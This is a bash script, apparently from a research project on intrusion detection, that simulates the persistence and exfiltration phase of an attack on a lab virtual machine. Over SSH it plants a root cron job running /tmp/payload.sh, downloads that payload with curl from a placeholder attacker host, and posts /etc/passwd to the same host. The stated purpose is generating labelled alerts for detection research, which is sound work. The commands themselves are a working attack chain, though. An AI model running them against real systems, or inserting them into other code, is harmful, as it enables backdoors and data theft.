#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# === Level 2 Phase 2: Persistence + Exfiltration ===
TARGET_IP="<TARGET_IP>"
TARGET_USER="user"
PAYLOAD="payload.sh"

echo "[+] Starting Level 2 - Phase 2: Persistence & Exfiltration"

# 1. Inject cron job (persistence)
echo "[+] Injecting cron job (backdoor)..."
ssh ${TARGET_USER}@${TARGET_IP} "echo '${TARGET_USER}' | sudo -S bash -c 'echo \"* * * * * /bin/bash /tmp/${PAYLOAD}\" > /etc/cron.d/malicious_job'"

# 2. Fetch payload.sh from Kali HTTP server
echo "[+] Simulating HTTP fetch of payload on target..."
ssh ${TARGET_USER}@${TARGET_IP} "curl http://<ATTACKER_IP>/${PAYLOAD} -o /tmp/${PAYLOAD}"

# 3. Simulate data exfiltration via POST to Kali (optional)
echo "[+] Simulating data exfiltration (from Ubuntu to Kali)..."
ssh ${TARGET_USER}@${TARGET_IP} "curl -X POST --data-binary @/etc/passwd http://<ATTACKER_IP>/upload"

echo "[+] Level 2 - Phase 2 simulation complete."

